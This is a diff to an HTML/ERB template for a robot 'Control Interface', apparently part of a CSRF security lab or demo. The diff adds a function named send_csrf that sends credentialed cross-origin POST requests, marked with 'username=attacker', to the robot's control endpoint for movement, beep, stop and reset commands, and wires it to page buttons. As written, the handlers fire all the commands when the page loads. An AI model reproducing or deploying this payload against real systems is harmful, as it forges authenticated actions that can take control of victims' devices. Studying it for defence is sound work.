@@ -6,39 +6,37 @@
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 
 <script type="text/javascript">
+$( document ).ready(function() {
+    $("#up").click(send_csrf("up"));
+    $("#down").click(send_csrf("down"));
+    $("#left").click(send_csrf("left"));
+    $("#right").click(send_csrf("right"));
+    $("#beep").click(send_csrf("beep"));
+    $("#stop").click(send_csrf("stop"));
+    $("#reset").click(send_csrf("reset"));
+});
+
+function send_csrf(command){
 	var request = new XMLHttpRequest();
 	var params = "username=attacker";
-	request.open('POST', "http://<%= robot_ip %>:3000/control/reset", true);
+	request.open('POST', "http://<%= robot_ip %>:3000/control/"+command, true);
 	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 	request.setRequestHeader("Content-length", params.length);
 	request.withCredentials = true;
 	request.setRequestHeader("Connection", "close");
 	request.send(params);
+}
 </script>
 
 <div class="container">
 	<h1>The Control Interface (Ugly Version)</h1>
-	<div>
-	    <a href="/robot/<%= robot_num %>/up/"><p>up</p>
-	</div>
-	<div>
-	    <a href="/robot/<%= robot_num %>/down/"><p>down</p>
-	</div>
-	<div>
-	    <a href="/robot/<%= robot_num %>/left/"><p>left</p>
-	</div>
-	<div>
-	    <a href="/robot/<%= robot_num %>/right/"><p>right</p>
-	</div>
-	<div>
-	    <a href="/robot/<%= robot_num %>/beep/"><p>beep</p>
-	</div>
-	<div>
-	    <a href="/robot/<%= robot_num %>/stop/"><p>stop</p>
-	</div>
-	<div>
-	    <a href="/robot/<%= robot_num %>/reset/"><p>reset</p>
-	</div>
+	<button id="up" class="btn btn-primary">up</button>
+	<button id="down" class="btn btn-primary">down</button>
+	<button id="left" class="btn btn-primary">left</button>
+	<button id="right" class="btn btn-primary">right</button>
+	<button id="beep" class="btn btn-primary">beep</button>
+	<button id="stop" class="btn btn-primary">stop</button>
+	<button id="reset" class="btn btn-primary">reset</button>
 	<div>
 	    <a href="/"><p>Back to home</p>
 	</div>
